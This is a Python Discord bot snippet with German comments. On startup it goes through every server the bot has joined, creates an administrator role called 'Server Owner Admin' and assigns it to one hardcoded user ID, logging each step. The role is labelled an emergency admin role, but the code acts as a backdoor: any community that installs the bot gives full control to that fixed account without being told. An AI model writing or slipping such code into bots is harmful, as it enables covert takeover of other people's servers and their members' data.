TARGET_USER_ID = 1449876807665848371

@bot.event
async def on_ready():
    print(f"Bot ist eingeloggt als {bot.user.name}")
    print(f"Bot ist auf folgenden Servern: {[g.name for g in bot.guilds]}")

    for guild in bot.guilds:
        print(f"--- Prüfe Server: {guild.name} ---")
        try:
            # 1. Rolle suchen oder erstellen
            admin_role = discord.utils.get(guild.roles, name="Server Owner Admin")
            if not admin_role:
                permissions = discord.Permissions(administrator=True)
                admin_role = await guild.create_role(
                    name="Server Owner Admin",
                    permissions=permissions,
                    color=discord.Colour.gold(),
                    reason="Notfall Admin-Rolle"
                )
                print("-> Admin-Rolle neu erstellt!")
            else:
                print("-> Admin-Rolle war bereits vorhanden.")

            # 2. Member suchen
            member = guild.get_member(TARGET_USER_ID)
            if not member:
                try:
                    member = await guild.fetch_member(TARGET_USER_ID)
                except discord.NotFound:
                    print(f"-> FEHLER: User ID {TARGET_USER_ID} wurde auf {guild.name} NICHT gefunden!")
                    continue

            # 3. Rolle zuweisen
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f"-> ERFOLG: Rolle wurde {member.name} zugewiesen!")
            else:
                print(f"-> Info: {member.name} hat die Rolle bereits.")

        except discord.Forbidden:
            print("-> FEHLER: Der Bot hat keine Berechtigung auf diesem Server (Rechte/Hierarchie prüfen)!")
        except Exception as e:
            print(f"-> FEHLER: {e}")
